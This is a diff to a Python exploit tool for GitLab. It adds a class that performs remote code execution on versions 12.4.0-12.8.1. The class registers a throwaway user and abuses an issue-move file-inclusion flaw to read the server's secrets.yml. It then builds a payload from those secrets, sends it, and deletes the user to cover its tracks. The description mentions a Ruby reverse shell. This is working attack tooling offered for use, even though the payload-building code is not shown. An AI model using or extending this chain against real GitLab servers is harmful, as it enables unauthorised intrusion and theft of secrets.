@@ -17,6 +17,8 @@ import urllib3
 
 import requests
 
+from helpers import *
+
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
@@ -44,11 +46,7 @@ class GitlabRCE:
             self.abort()
         return token
 
-    def randomize(self):
-        sequence = string.ascii_letters + string.digits
-        random_list = random.choices(sequence, k=10)
-        random_string = "".join(random_list)
-        return random_string
+
 
     def register_user(self):
         authenticity_token = self.get_authenticity_token(self.url + "/users/sign_in")
@@ -210,6 +208,26 @@ class GitlabRCE1281LFIUser(GitlabRCE1281LFI):
         if not lfi_path:
             return self.file_to_lfi
         return lfi_path
+
+class GitlabRCE1281RCE(GitlabRCE1281LFI):
+	description = "RCE for version 12.4.0-12.8.1 - !!RUBY REVERSE SHELL IS VERY UNRELIABLE!! WIP"
+
+	def __init__(self):
+		pass
+
+	
+
+	def main(self):
+		self.file_to_lfi = "/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml"
+		self.register_user()
+		self.create_empty_project()
+		self.create_empty_project()
+		self.create_issue(self.projects[0], self.lfi_path())
+		file_contents = self.exploit_move_issue()
+		secret = self.parse_secrets(file_contents)
+		payload = self.build_payload(secret)
+		self.send_payload(payload)
+		self.delete_user()
 
 
 class GitlabVersion(GitlabRCE):
